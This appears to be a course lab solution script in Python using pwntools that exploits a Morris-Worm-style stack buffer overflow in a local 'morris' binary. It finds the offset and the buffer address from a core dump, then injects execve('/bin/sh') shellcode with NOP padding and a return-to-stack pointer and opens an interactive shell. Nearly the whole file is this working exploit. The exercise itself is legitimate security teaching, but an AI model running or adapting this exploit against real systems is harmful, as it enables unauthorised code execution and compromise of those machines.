#!/usr/bin/env python3
"""Solution for morris: 1988 Morris-Worm-style finger overflow (return-to-stack).

There is NO address leak here -- finding the buffer address is the real
challenge from the lecture (slides 27-30, "Exploit w/ or w/o GDB",
"Why Different?"). ASLR is off on the VM and both runs inherit the same
environment, so the stack address is deterministic. We:
  1) crash with a cyclic pattern and read the core dump,
  2) recover the offset with cyclic_find(core.eip),
  3) locate buf by finding our pattern inside the core's STACK mapping
     (searching all memory would also match a stray copy at a low address),
  4) exploit a fresh run with the shellcode at the start of buf.

Run:  cd example3 && make && python3 solution3/solve_morris.py
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "morris")

def recon():
    """Crash with a cyclic pattern; from the core dump get the offset and buf.

    Both this run and the exploit run inherit the same environment, and ASLR
    is off, so buf lands at the same stack address in both.
    """
    io = process(BIN)
    io.sendline(cyclic(2000))
    io.wait()
    core = io.corefile
    offset = cyclic_find(core.eip)          # which 4 bytes of the pattern hit eip
    # Find the pattern in the STACK mapping specifically. A plain
    # core.search() would also match a stray copy at a low (non-stack)
    # address and hand back the wrong pointer.
    stack = core.stack
    buf_addr = stack.address + stack.data.find(cyclic(8))   # pattern starts at buf
    io.close()
    log.success("offset(buf -> return address) = %d", offset)
    log.success("buf @ %#x", buf_addr)
    return offset, buf_addr


def main():
    offset, buf_addr = recon()

    shellcode = asm(shellcraft.sh())         # execve("/bin/sh", 0, 0)
    # Shellcode at the START of buf, NOP padding after it. ESP sits just above
    # buf when main returns and its pushes grow down, so shellcode at the top
    # would clobber its own tail; at the bottom it stays clear.
    payload = shellcode + b"\x90" * (offset - len(shellcode))
    assert len(payload) == offset, "shellcode larger than the buffer"
    payload += p32(buf_addr)                  # return to buf start = shellcode

    io = process(BIN)
    io.sendline(payload)
    log.success("shellcode injected -- checking for a shell")
    io.sendline(b"id; uname -a; echo MORRIS_PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
